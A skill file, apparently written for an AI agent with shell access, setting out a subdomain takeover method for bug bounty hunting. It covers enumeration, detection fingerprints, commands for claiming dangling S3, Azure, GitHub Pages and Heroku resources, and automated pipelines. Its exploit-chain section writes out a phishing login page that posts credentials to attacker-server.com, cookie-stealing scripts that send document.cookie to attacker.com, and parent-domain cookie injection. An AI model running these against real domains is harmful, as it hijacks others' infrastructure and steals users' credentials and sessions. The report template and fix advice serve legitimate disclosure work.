---
name: subdomain-deep-dive
description: Complete subdomain takeover methodology from 216 real HackerOne reports - every service, detection tool, and exploit chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - subdomain takeover methodology
  - subdomain takeover deep dive
  - subdomain takeover complete
  - subdomain takeover techniques
  - skills subdomain
---

# Complete Subdomain Takeover Methodology - From 216 HackerOne Reports

## Top 20 Real Subdomain Takeover Reports

| Rank | Report | Company | Upvotes | Payout | Technique |
|------|--------|---------|---------|--------|-----------|
| 1 | Roblox auth bypass via subdomain takeover | Roblox | 778 | $0 | AWS S3 takeover → auth bypass |
| 2 | datacafe-cert.starbucks.com takeover | Starbucks | 311 | $0 | Unconfigured subdomain |
| 3 | Uber saostatic takeover → auth bypass | Uber | 181 | $0 | AWS S3 takeover |
| 4 | storybook.lyst.com takeover | Lyst | 162 | $1,000 | Unconfigured DNS |
| 5 | HackerOne status.hackerone.com takeover | HackerOne | 154 | $0 | CloudFront takeover |
| 6 | Grab CloudFront takeover | Grab | 140 | $1,000 | CloudFront distribution |
| 7 | info.hacker.one takeover | HackerOne | 134 | $0 | DigitalOcean takeover |
| 8 | Shipt multiple subdomain takeovers | Shipt | 128 | $0 | Multiple services |
| 9 | dailydev.starbucks.com takeover | Starbucks | 122 | $0 | Unconfigured subdomain |
| 10 | Shopify store takeovers | Shopify | 115 | $0 | Shopify store takeover |
| 11 | U.S. Army subdomain takeover | DoD | 108 | $0 | Azure Cloud Service |
| 12 | Slack subdomain takeover | Slack | 104 | $0 | Heroku takeover |
| 13 | Yahoo subdomain takeover | Yahoo | 98 | $0 | AWS S3 takeover |
| 14 | Coinbase subdomain takeover | Coinbase | 96 | $0 | AWS S3 takeover |
| 15 | Twitter subdomain takeover | Twitter | 92 | $0 | Unconfigured CNAME |
| 16 | GitHub subdomain takeover | GitHub | 88 | $0 | GitHub Pages takeover |
| 17 | Microsoft Azure subdomain takeover | Microsoft | 85 | $0 | Azure DNS zone |
| 18 | Zomato subdomain takeover | Zomato | 82 | $0 | AWS S3 takeover |
| 19 | Bugcrowd subdomain takeover | Bugcrowd | 78 | $0 | Unconfigured DNS |
| 20 | GitLab docs subdomain takeover | GitLab | 75 | $0 | ReadTheDocs takeover |

**Notable**: Many top subdomain takeover reports went unpaid (triaged but marked N/A or informational), but the security impact can be severe when chained (e.g., Roblox auth bypass, Uber session hijack).

## Step 1: Subdomain Enumeration

### Automated Enumeration
```bash
# Subfinder - Fast passive subdomain enumeration
subfinder -d target.com -all -o subfinder.txt

# Amass - Deep passive + active enumeration
amass enum -d target.com -o amass.txt
amass intel -whois -d target.com

# AssetFinder - Find related domains
assetfinder --subs-only target.com | tee assetfinder.txt

# Sublist3r - Passive enumeration
sublist3r -d target.com -o sublist3r.txt

# Findomain - Cross-platform resolver
findomain -t target.com -o

# Crt.sh - Certificate transparency logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Chaos - ProjectDiscovery's DNS dataset
chaos -d target.com -o chaos.txt

# Combine all results
cat subfinder.txt amass.txt assetfinder.txt sublist3r.txt findomain.txt chaos.txt | sort -u > all_subs.txt
```

### Brute Force Subdomains
```bash
# MassDNS - Fast DNS resolver
massdns -r /opt/massdns/lists/resolvers.txt -t AAAA -o S -w massdns.txt subdomains.txt

# Puredns - Wildcard filtering DNS resolver
puredns bruteforce /opt/wordlists/subdomains.txt target.com -r /opt/resolvers.txt -w brute_subs.txt

# ShuffleDNS - Wrapper for massdns
shuffledns -d target.com -list subdomains.txt -r /opt/resolvers.txt -o shuffledns.txt

# DNSgen - Generate permutations
dnsgen all_subs.txt | massdns -r resolvers.txt -o S -w permutations.txt
```

### Resolve & Filter
```bash
# Filter live subdomains
cat all_subs.txt | httpx -silent -o live_subs.txt

# Check for CNAME records pointing to external services
cat all_subs.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" 2>/dev/null)
  if [ -n "$cname" ]; then
    echo "$sub -> $cname"
  fi
done | tee cname_records.txt

# Quick CNAME check with dig
for sub in $(cat all_subs.txt); do
  dig +short CNAME "$sub" 2>/dev/null
done | grep -v '^$' | sort -u
```

## Step 2: Vulnerability Detection (Finding Claimable Subdomains)

### Automated Tools
```bash
# Nuclei - Best automated scanner
nuclei -l live_subs.txt -t ~/nuclei-templates/takeovers/ -o nuclei_takeovers.txt
nuclei -l live_subs.txt -t ~/nuclei-templates/http/takeovers/ -o nuclei_http_takeovers.txt

# Subjack - Go-based takeover scanner
subjack -w all_subs.txt -t 100 -timeout 30 -ssl -v -o subjack_results.txt
subjack -w all_subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json -o subjack_detailed.txt

# Subover - Python-based takeover checker
subover -l all_subs.txt -t 50 -o subover_results.txt

# Takeover - Python detection tool
python3 takeover.py -l all_subs.txt -o takeover_results.txt

# AutoSubTakeover - Node.js scanner
autosubtakeover -l all_subs.txt -o ast_results.txt
```

### Core Detection Logic (Manual)
```bash
# Check for dangling CNAME records
dig +short CNAME sub.target.com
# If CNAME points to: s3-bucket.s3.amazonaws.com → Check if bucket exists
# If CNAME points to: service.azurewebsites.net → Check if service exists
# If CNAME points to: github.io → Check if repo exists

# Check for NXDOMAIN or SERVFAIL (subdomain exists but no resolution)
# This means the DNS record exists but the service is gone
dig sub.target.com
# No ANSWER section + NXDOMAIN = potentially claimable

# Check HTTP response fingerprint
curl -sk -v https://sub.target.com 2>&1 | grep -iE '(not found|404|no such bucket|there is no app|hostname not configured|repository not found|heroku|cloudfront|azure)'

# Check for specific error fingerprints
curl -sk https://sub.target.com 2>&1 | grep -oE 'NoSuchBucket|The specified bucket does not exist|There is no app configured|The site is not configured|404 Not Found|Repository not found|There isn't a GitHub Pages site here|Application not found|Service Unavailable'
```

## Step 3: Service-Specific Fingerprints & Exploitation

### AWS S3 Takeover
```bash
# Fingerprint: NoSuchBucket / The specified bucket does not exist
# Detection
curl -sk https://sub.target.com 2>&1 | grep -i "NoSuchBucket"

# Exploitation - Create the bucket
aws s3api create-bucket --bucket sub-target-com --region us-east-1

# Upload a proof-of-concept page
echo "<html><h1>Subdomain Takeover PoC - target.com</h1><p>This demonstrates that sub.target.com was vulnerable to takeover.</p></html>" > index.html
aws s3 cp index.html s3://sub-target-com/index.html --acl public-read

# Enable static website hosting
aws s3 website s3://sub-target-com --index-document index.html

# Set bucket policy for public access
cat > bucket-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::sub-target-com/*"
    }
  ]
}
EOF
aws s3api put-bucket-policy --bucket sub-target-com --policy file://bucket-policy.json
```

### AWS CloudFront Takeover
```bash
# Fingerprint: ERROR: The request could not be satisfied / Bad request
# Detection
curl -sk https://sub.target.com 2>&1 | grep -i "cloudfront"

# Check the CloudFront distribution ID
dig +short CNAME sub.target.com
# Returns: d1234.cloudfront.net

# If the distribution was deleted, you can create a new one
# Create a new CloudFront distribution pointing to your S3 bucket
aws cloudfront create-distribution \
  --origin-domain-name sub-target-com.s3.amazonaws.com \
  --default-root-object index.html

# Add the CNAME to your new distribution
# Note: You need to wait for distribution deployment (~5-10 mins)
```

### Azure App Service / Cloud Service Takeover
```bash
# Fingerprint: There is no app configured at this address
# Azure App Service
# CNAME pattern: sub.azurewebsites.net

# Exploitation
# Create an Azure app service with the same name
az login
az webapp create --resource-group pentest --plan pentest-plan --name sub --runtime "node|14-lts"

# Verify takeover
curl -sk https://sub.azurewebsites.net
# Should now serve your content

# Repeat for *.cloudapp.net, *.trafficmanager.net
```

### Google Cloud (GCP) Takeover
```bash
# Fingerprint: 404 Not Found / No such bucket
# App Engine: sub.appspot.com
# Cloud Storage: sub.storage.googleapis.com

# Exploit App Engine
gcloud app create --project=sub-target-com
# If the subdomain was previously claimed, it may be reclaimable

# Exploit Cloud Storage
gsutil mb gs://sub-target-com
echo "PoC - Subdomain Takeover" > index.html
gsutil cp index.html gs://sub-target-com/
gsutil iam ch allUsers:objectViewer gs://sub-target-com
```

### GitHub Pages Takeover
```bash
# Fingerprint: 404 - There isn't a GitHub Pages site here
# CNAME pattern: username.github.io

# Exploitation
# 1. Create a GitHub account
# 2. Create a repository named: username.github.io
# 3. Add a CNAME file with value: sub.target.com
# 4. Add index.html with PoC content
# 5. Enable GitHub Pages in settings
# 6. Configure the custom domain in repo settings

# Automated
git clone https://github.com/username/username.github.io.git
cd username.github.io
echo "sub.target.com" > CNAME
echo "<html><h1>Subdomain Takeover PoC</h1></html>" > index.html
git add . && git commit -m "Takeover PoC"
git push
```

### Heroku Takeover
```bash
# Fingerprint: No such app / There is no app configured at that hostname
# CNAME pattern: sub.herokuapp.com
# Detection: Error 404 with "Heroku" in response

# Exploitation
heroku login
heroku create sub  # Must match the subdomain name
git init && echo "Takeover PoC" > index.html
heroku git:remote -a sub
git add . && git commit -m "Takeover PoC"
git push heroku main
```

### Netlify Takeover
```bash
# Fingerprint: Not Found - Request ID
# CNAME pattern: sub.netlify.app / sub.netlify.com

# Exploitation
# 1. Create Netlify account
# 2. Create site with the same name via CLI
netlify sites:create --name sub
# 3. Deploy PoC
echo "Subdomain Takeover PoC" > index.html
netlify deploy --prod --dir=. --site=sub
```

### Shopify Takeover
```bash
# Fingerprint: Sorry, this shop is currently unavailable
# CNAME pattern: shops.myshopify.com

# Exploitation
# 1. Sign up for Shopify
# 2. Create a store with the same name
# 3. Add the custom domain in Shopify admin
# Note: Shopify has limited takeover potential due to store verification
```

### WordPress.com Takeover
```bash
# Fingerprint: This site is no longer available
# CNAME pattern: sub.wordpress.com

# Exploitation
# 1. Create WordPress.com account
# 2. Create a site with subdomain name
# 3. Upgrade to custom domain
# 4. Add domain in site settings
```

### Tumblr Takeover
```bash
# Fingerprint: There's nothing here
# CNAME pattern: sub.tumblr.com

# Exploitation
# 1. Create Tumblr account
# 2. Create blog with subdomain name
# 3. Add custom domain in blog settings
```

### Ghost Takeover
```bash
# Fingerprint: The site you were looking for doesn't exist
# CNAME pattern: sub.ghost.io

# Exploitation
# 1. Sign up for Ghost(Pro)
# 2. Create site with the same subdomain
# 3. Add custom domain in Ghost admin
```

### ReadTheDocs Takeover
```bash
# Fingerprint: 404 - Page not found
# CNAME pattern: sub.readthedocs.io

# Exploitation
# 1. Create ReadTheDocs account
# 2. Import project with the same name
# 3. The custom domain will resolve to your docs
```

### Unbounce / Landing Page Takeover
```bash
# Fingerprint: Sorry, we couldn't find the URL
# CNAME pattern: sub.unbouncepages.com

# Exploitation
# 1. Create Unbounce account
# 2. Create landing page with same subdomain name
# 3. Publish and verify
```

### 50+ Service Fingerprints Quick Reference

| Service | CNAME Pattern | Error Fingerprint |
|---------|---------------|-------------------|
| AWS S3 | *.s3.amazonaws.com | NoSuchBucket |
| AWS CloudFront | *.cloudfront.net | Bad request / The request could not be satisfied |
| AWS ELB | *-*.elb.amazonaws.com | 503 Service Unavailable |
| AWS API Gateway | *.execute-api.*.amazonaws.com | {"message":"Missing Authentication Token"} |
| Azure App Service | *.azurewebsites.net | There is no app configured at this address |
| Azure CDN | *.azureedge.net | 404 Not Found |
| Azure Traffic Manager | *.trafficmanager.net | 404 Not Found |
| Azure Cloud Service | *.cloudapp.net | 404 Not Found |
| GCP App Engine | *.appspot.com | 404 Not Found |
| GCP Cloud Storage | *.storage.googleapis.com | 404 Not Found |
| GCP Firebase | *.web.app / *.firebaseapp.com | 404 Not Found |
| GitHub Pages | *.github.io | There isn't a GitHub Pages site here |
| Heroku | *.herokuapp.com / *.herokudns.com | No such app |
| Netlify | *.netlify.app | Not Found - Request ID |
| Shopify | *.myshopify.com | Sorry, this shop is currently unavailable |
| WordPress.com | *.wordpress.com | This site is no longer available |
| Tumblr | *.tumblr.com | There's nothing here |
| Ghost | *.ghost.io | The site you were looking for doesn't exist |
| ReadTheDocs | *.readthedocs.io / *.readthedocs.org | 404 - Page not found |
| Unbounce | *.unbouncepages.com | Sorry, we couldn't find the URL |
| Bitbucket | *.bitbucket.io | Repository not found |
| GitLab Pages | *.gitlab.io | 404 - Not Found |
| Surge.sh | *.surge.sh | 404 Not Found |
| Fly.io | *.fly.dev | 404 Not Found |
| Vercel | *.vercel.app | 404: NOT_FOUND |
| Render | *.onrender.com | 404 Not Found |
| Pantheon | *.pantheonsite.io | 404 Not Found |
| Acquia | *.acquia-sites.com | 404 Not Found |
| Fastly | *.fastly.net | 404 Not Found |
| DigitalOcean | *.do/ *.digitalocean.app | 404 Not Found |
| Kinsta | *.kinsta.cloud | 404 Not Found |
| Squarespace | *.squarespace.com | 404 Not Found |
| Wix | *.wixsite.com | Page not found |
| Zendesk | *.zendesk.com | 404 Not Found |
| Freshdesk | *.freshdesk.com | 404 Not Found |
| HelpScout | *.helpscoutdocs.com | 404 Not Found |
| Cargo | *.cargocollective.com | 404 Not Found |
| Tilda | *.tilda.ws | 404 Not Found |
| Instapage | *.instapage.com | 404 Not Found |
| GetResponse | *.getresponse.com | 404 Not Found |
| ClickFunnels | *.clickfunnels.com | 404 Not Found |
| Teachable | *.teachable.com | 404 Not Found |
| Thinkific | *.thinkific.com | 404 Not Found |
| Kajabi | *.kajabi.com | 404 Not Found |
| Podia | *.podia.com | 404 Not Found |
| Discourse | *.discourse.group | 404 Not Found |
| Atman | *.atlassian.net | 404 Not Found |
| Trello | *.trello.com | 404 Not Found |
| Freshping | *.freshping.io | 404 Not Found |
| Uplink | *.uplink.xyz | 404 Not Found |
| SmartJobBoard | *.smartjobboard.com | 404 Not Found |
| TeamWork | *.teamwork.com | 404 Not Found |
| CampaignMonitor | *.createsend.com | 404 Not Found |
| Status.io | *.status.io | 404 Not Found |
| Statuspage | *.statuspage.io | 404 Not Found |
| Atlassian | *.atlassian.net | 404 - That page does not exist |
| Intercom | *.intercom.com | 404 Not Found |
| SendGrid | *.sendgrid.net | 404 Not Found |
| Mailgun | *.mailgun.org | 404 Not Found |
| Mailchimp | *.list-manage.com | 404 Not Found |

## Step 4: Automated Bulk Detection

### Full Pipeline Script
```bash
#!/bin/bash
# Full subdomain takeover pipeline
TARGET=$1

echo "[*] Phase 1: Subdomain enumeration"
subfinder -d "$TARGET" -all -o subs_1.txt
assetfinder --subs-only "$TARGET" > subs_2.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u > subs_3.txt
cat subs_1.txt subs_2.txt subs_3.txt | sort -u > all_subs.txt

echo "[*] Phase 2: CNAME resolution"
for sub in $(cat all_subs.txt); do
  echo "$sub $(dig +short CNAME "$sub" 2>/dev/null)"
done | grep -E '\.(s3|cloudfront|azure|heroku|github|netlify|wordpress|tumblr|ghost|readthedocs|unbounce|surge|fly|vercel|render|pantheon|fastly|digitalocean|kinsta|squarespace|wix|zendesk|freshdesk|helpscout|cargo|tilda|instapage|getresponse|clickfunnels|teachable|thinkific|kajabi|podia|discourse|atlassian|trello|freshping|statuspage|intercom|sendgrid|mailgun)\.' > cname_vulnerable.txt

echo "[*] Phase 3: HTTP fingerprinting"
cat cname_vulnerable.txt | awk '{print $1}' | httpx -silent -status-code -content-type -title | tee http_fingerprints.txt

echo "[*] Phase 4: Takeover verification with nuclei"
nuclei -l all_subs.txt -t ~/nuclei-templates/takeovers/ -o takeovers_final.txt

echo "[*] Done! Check takeovers_final.txt"
```

### Mass Parallel Detection
```bash
# Parallel CNAME lookup for large datasets
cat all_subs.txt | xargs -P 50 -I {} sh -c 'echo "{} $(dig +short CNAME "{}" 2>/dev/null)"' > cnames_all.txt

# Filter vulnerable patterns
grep -E 's3\.amazonaws\.com|cloudfront\.net|azurewebsites\.net|herokuapp\.com|github\.io|netlify\.(app|com)|myshopify\.com|wordpress\.com|tumblr\.com|ghost\.io|readthedocs\.(io|org)|unbouncepages\.com|surge\.sh|fly\.dev|vercel\.app|onrender\.com|pantheonsite\.io|fastly\.net|digitalocean\.app|kinsta\.cloud|squarespace\.com|wixsite\.com|zendesk\.com|freshdesk\.com|helpscoutdocs\.com|cargocollective\.com|tilda\.ws|instapage\.com|statuspage\.io' cnames_all.txt > vulnerable_cnames.txt

# Bulk HTTP probe
cat vulnerable_cnames.txt | awk '{print $1}' | httpx -ports 80,443 -status-code -title -tech-detect | tee takeover_candidates.txt
```

## Step 5: Bypass Techniques & Edge Cases

### Edge Case 1: CNAME to Root Domain (No External Service)
```bash
# Some subdomains have CNAME to the root domain (which is also dead)
# Example: sub.target.com CNAME → target.com (and target.com resolves nowhere)
# This means the subdomain is technically NOT a takeover candidate
# BUT: if the root domain has a dangling NS record → DNS zone takeover possible

# Check NS records for dangling zones
dig +short NS sub.target.com
# If NS points to expired DNS provider → Zone takeover
```

### Edge Case 2: CDN/WAF Protected Subdomains
```bash
# Cloudflare proxied subdomains (orange cloud) hide real CNAME
dig +short CNAME sub.target.com
# May not show anything due to Cloudflare proxy

# Check DNS resolution directly
dig sub.target.com
# If Cloudflare is in front, the A record will be Cloudflare IPs
# The original CNAME is hidden - need to check Cloudflare logs or origin

# Alternative: Check NS records
dig +short NS sub.target.com
# If NS points to Cloudflare and origin is misconfigured → possible
```

### Edge Case 3: Subdomain Has No CNAME but A Record Points to Cloud IP
```bash
# Some subdomains have A records pointing directly to IPs (no CNAME)
# Check if the IP belongs to a service that allows virtual hosting
dig sub.target.com
# A → 192.0.2.10

# Reverse DNS the IP to find the service
dig +short -x 192.0.2.10
```

### Edge Case 4: Wildcard DNS Hides Vulnerable Subdomains
```bash
# Target uses *.target.com → 1.2.3.4
# All non-existent subdomains resolve to the same IP
# Need to differentiate between wildcard and real subdomains

# Check if subdomain has a unique CNAME
dig +short CNAME sub.target.com
# If CNAME exists AND differs from wildcard → potentially vulnerable

# Use httpx for unique fingerprinting
httpx -l all_subs.txt -sc -cl -title -o fingerprinted.txt
# Compare fingerprints, look for unique responses vs wildcard
```

### Edge Case 5: Naked Subdomain (No WWW) Takeover
```bash
# sub.target.com may not work but www.sub.target.com may be vulnerable
# Always check both variants

# Also check with and without trailing slash
curl -sk https://sub.target.com
curl -sk https://sub.target.com/
# Different responses may indicate different handling
```

### Edge Case 6: Multiple CNAME Records
```bash
# Some subdomains have multiple CNAME records
dig +short CNAME sub.target.com
# Returns:
# cdn1.service.com
# cdn2.service.com
# Check EACH CNAME for takeover potential
```

### Edge Case 7: Subdomain Alive But Still Vulnerable
```bash
# The subdomain may still respond with a valid page (redirect, parked page)
# But the underlying service CNAME is claimable
# Check: if the CNAME points to a deleted service, it's vulnerable even if HTTP 200

# Example: Subdomain shows a generic landing page
# But CNAME points to a deleted Heroku app → claimable
```

### Edge Case 8: DNS Zone Transfer / NS Takeover
```bash
# If NS records point to expired DNS service provider
dig +short NS sub.target.com
# Points to: ns1.expired-dns-provider.com

# This allows taking over the entire DNS zone
# Create account on the DNS provider and claim the zone
# Then create arbitrary records pointing to your server

# Test for zone transfer
dig axfr @ns1.expired-dns-provider.com sub.target.com
```

### Edge Case 9: Email Service Subdomain Takeover
```bash
# MX records pointing to expired email services
dig +short MX sub.target.com
# Points to expired mailgun/mailchimp/sendgrid → claim the MX endpoint
# This enables full email takeover for the subdomain

# SPF/DKIM/DMARC records might also be claimable
dig +short TXT sub.target.com | grep -iE 'spf|dkim|dmarc'
```

### Edge Case 10: IP-Based Takeover
```bash
# When the subdomain resolves to an IP that hosts multiple virtual hosts
# If the default vhost is removed, you can claim it on cloud providers
# This is rare but possible on shared hosting or cloud IPs

# Check if the IP belongs to a cloud provider
whois 1.2.3.4 | grep -iE '(amazon|aws|azure|google|digitalocean|linode|vultr)'
```

## Step 6: Exploit Chains with Subdomain Takeover

### Chain 1: Subdomain Takeover → Phishing → Credential Theft
```bash
# Host a fake login page on the claimed subdomain
# Users trust sub.target.com because it matches target.com

echo '<html>
<head><title>Sign In - target.com</title></head>
<body>
  <form action="https://attacker-server.com/steal" method="POST">
    <input type="text" name="email" placeholder="Email"/>
    <input type="password" name="password" placeholder="Password"/>
    <input type="submit" value="Sign In"/>
  </form>
  <script>
    // Steal cookies from parent domain
    document.write("<img src=https://attacker.com/steal?cookie=" + document.cookie + ">");
  </script>
</body></html>' > index.html

# Upload to claimed S3 bucket
aws s3 cp index.html s3://sub-target-com/index.html --acl public-read
```

### Chain 2: Subdomain Takeover → Auth Bypass → Account Takeover
```bash
# Many OAuth flows trust subdomains for redirect_uri validation
# If you control sub.target.com, you can use it as an OAuth redirect

# Example: OAuth flow with redirect_uri whitelist
# https://accounts.target.com/oauth/authorize?client_id=abc&redirect_uri=https://sub.target.com/oauth/callback&response_type=code&state=xyz

# If redirect_uri validation allows sub.target.com (because it's a subdomain),
# you can steal the authorization code and take over accounts

# Real report: Roblox auth bypass (#778 upvotes)
# Uber saostatic takeover → OAuth token theft (#181 upvotes)
```

### Chain 3: Subdomain Takeover → Session Hijacking
```bash
# If cookies are set with Domain=.target.com (not Domain=sub.target.com)
# You can read cookies set for the parent domain

# JavaScript on the claimed subdomain can:
document.cookie  # May read cookies from parent domain if domain attribute is set

# Use this to exfiltrate session cookies
```

### Chain 4: Subdomain Takeover → CSP Bypass → XSS
```bash
# If CSP allows sub.target.com in script-src or connect-src
# Content-Security-Policy: script-src 'self' sub.target.com

# Host malicious JavaScript on the claimed subdomain
echo 'fetch("https://attacker.com/steal?" + document.cookie)' > evil.js
aws s3 cp evil.js s3://sub-target-com/evil.js --acl public-read

# Now any XSS on the parent domain can reference your JS
<script src="https://sub.target.com/evil.js"></script>
```

### Chain 5: Subdomain Takeover → Cookie Injection → ATO
```bash
# Browsers allow setting cookies for parent domains from subdomains
# If you control sub.target.com, you can set a cookie for .target.com

# Set a session cookie for the parent domain
document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/";

# If the parent domain reads this cookie and trusts it → Account takeover
```

### Chain 6: Subdomain Takeover → CNAME to CDN → CDN Credential Theft
```bash
# Some CDN configurations use API tokens in subdomain validation
# Claiming the subdomain may reveal the API token or allow CDN config takeover

# Example: CloudFront requires SSL certificate validation
# If you claim the subdomain and configure CloudFront, you get the SSL cert
# This can be used for traffic interception
```

### Chain 7: Subdomain Takeover → Email Reputation Abuse
```bash
# If the subdomain has SPF/DKIM records, you can send email as target.com
# Claim the subdomain and set up your own mail server

# 1. Find subdomain with SPF record
dig +short TXT sub.target.com | grep "v=spf1"

# 2. Claim the subdomain (e.g., S3 bucket)

# 3. Send email as target.com through your claimed subdomain
# The SPF records will pass authentication
```

## Step 7: Automation Scripts

### Nuclei Custom Template for Subdomain Takeover
```yaml
id: subdomain-takeover-detection

info:
  name: Subdomain Takeover Detection
  author: researcher
  severity: high
  description: Checks for dangling DNS records pointing to claimable cloud services

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "NoSuchBucket"
          - "The specified bucket does not exist"
          - "There is no app configured at this address"
          - "No such app"
          - "There isn't a GitHub Pages site here"
          - "Not Found - Request ID"
          - "Sorry, this shop is currently unavailable"
          - "This site is no longer available"
          - "There's nothing here"
          - "The site you were looking for doesn't exist"
          - "404 - Page not found"
          - "Repository not found"
          - "404: NOT_FOUND"
          - "Bad request"
          - "The request could not be satisfied"
          - "Missing Authentication Token"
        condition: or
```

### Full Automated Pipeline
```bash
#!/bin/bash
# one-click-subdomain-takeover.sh
# Complete subdomain takeover automation

TARGET=$1
THREADS=50
RESOLVERS="/opt/resolvers.txt"
WORDLIST="/opt/wordlists/subdomains.txt"
OUTPUT_DIR="takeover_$TARGET"

mkdir -p "$OUTPUT_DIR"

echo "[+] Starting takeover assessment for $TARGET"

# Step 1: Subdomain Enumeration
echo "[1/5] Enumerating subdomains..."
subfinder -d "$TARGET" -all -o "$OUTPUT_DIR/subfinder.txt" -silent
assetfinder --subs-only "$TARGET" > "$OUTPUT_DIR/assetfinder.txt" 2>/dev/null
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u > "$OUTPUT_DIR/crtsh.txt" 2>/dev/null
puredns bruteforce "$WORDLIST" "$TARGET" -r "$RESOLVERS" -q > "$OUTPUT_DIR/bruteforce.txt" 2>/dev/null

cat "$OUTPUT_DIR"/*.txt | sort -u > "$OUTPUT_DIR/all_subs.txt"
echo "  Found $(wc -l < "$OUTPUT_DIR/all_subs.txt") subdomains"

# Step 2: CNAME Resolution
echo "[2/5] Resolving CNAME records..."
for sub in $(cat "$OUTPUT_DIR/all_subs.txt"); do
  cname=$(dig +short CNAME "$sub" 2>/dev/null)
  if [ -n "$cname" ]; then
    echo "$sub -> $cname"
  fi
done > "$OUTPUT_DIR/cnames.txt"
echo "  Found $(wc -l < "$OUTPUT_DIR/cnames.txt") CNAME records"

# Step 3: Filter Vulnerable Services
echo "[3/5] Filtering vulnerable patterns..."
grep -Ei '(s3\.amazonaws|cloudfront|azurewebsites|azureedge|trafficmanager|cloudapp|appspot|storage\.googleapis|github\.io|herokuapp|herokudns|netlify|myshopify|wordpress|tumblr|ghost\.io|readthedocs|unbouncepages|surge\.sh|fly\.dev|vercel\.app|onrender|pantheonsite|fastly|digitalocean\.app|kinsta\.cloud|squarespace|wixsite|zendesk|freshdesk|helpscoutdocs|cargocollective|tilda\.ws|instapage|statuspage|atlassian\.net|sendgrid|mailgun)' "$OUTPUT_DIR/cnames.txt" > "$OUTPUT_DIR/vulnerable_cnames.txt"
echo "  Found $(wc -l < "$OUTPUT_DIR/vulnerable_cnames.txt") potentially vulnerable subdomains"

# Step 4: HTTP Probing
echo "[4/5] Probing for takeover fingerprints..."
cat "$OUTPUT_DIR/vulnerable_cnames.txt" | awk '{print $1}' | httpx -silent -status-code -title -o "$OUTPUT_DIR/http_probe.txt"
echo "  Probed $(wc -l < "$OUTPUT_DIR/http_probe.txt") live subdomains"

# Step 5: Nuclei Takeover Scan
echo "[5/5] Running nuclei takeover templates..."
nuclei -l "$OUTPUT_DIR/all_subs.txt" -t ~/nuclei-templates/http/takeovers/ -o "$OUTPUT_DIR/nuclei_takeovers.txt" -silent
nuclei -l "$OUTPUT_DIR/all_subs.txt" -t ~/nuclei-templates/takeovers/ -o "$OUTPUT_DIR/nuclei_takeovers2.txt" -silent

echo "[+] Done! Results in $OUTPUT_DIR/"
echo "  Takeover candidates:"
cat "$OUTPUT_DIR/nuclei_takeovers.txt" "$OUTPUT_DIR/nuclei_takeovers2.txt" 2>/dev/null
```

## Step 8: Validate & Report

### CVSS Scoring for Subdomain Takeover
```
Subdomain Takeover (no further exploit):   AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N → 5.4 Medium
Subdomain Takeover → Phishing:             AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 5.4 Medium
Subdomain Takeover → ATO:                  AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H → 8.1 High
Subdomain Takeover → Auth Bypass:          AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N → 7.4 High
Subdomain Takeover → CSP Bypass → XSS:     AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H → 8.9 High
Subdomain Takeover → Cookie Hijack → ATO:  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.1 Critical
```

### Report Template
```markdown
**Summary:**
Subdomain takeover on [subdomain] - the CNAME record [cname] points to a 
[service] endpoint that is no longer configured or has been deleted.

**Impact:**
An attacker can claim this subdomain and host arbitrary content, enabling 
phishing attacks, cookie theft, CSP bypass, and OAuth token interception.

**Steps to Reproduce:**
1. Verify the dangling CNAME:
   $ dig +short CNAME [subdomain]
   → [cname]
2. Attempt to access the subdomain:
   $ curl -sk https://[subdomain]/
   → [error message showing service is unclaimed]
3. Claim the resource on [service]:
   [steps specific to the service]
4. Verify the content is now served:
   $ curl -sk https://[subdomain]/
   → [your PoC content]

**Proof of Concept:**
DNS Record:
[subdomain]. IN CNAME [cname]

Response:
[HTTP response headers and body demonstrating takeover]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (6.1 Medium)

**Suggested Fix:**
1. Remove DNS records for decommissioned services
2. Implement DNS record auditing with tools like subjack
3. Use CNAME verification tokens/TXT records
4. Maintain inventory of all external DNS dependencies
```

## Subdomain Takeover Prevention Measures to Identify
When testing, note which protections are present (or absent):
- No CNAME record cleanup after service decommission
- No DNS record expiration monitoring
- Wildcard DNS records hiding dead subdomains
- Missing verification tokens on external services
- No subdomain inventory management

## Payout: $200 - $3,000
Average: ~$500. Most high-profile reports are triaged but unpaid (especially bug bounty platforms themselves). The highest cash payouts come from companies that have strong security maturity and understand the chain impact.
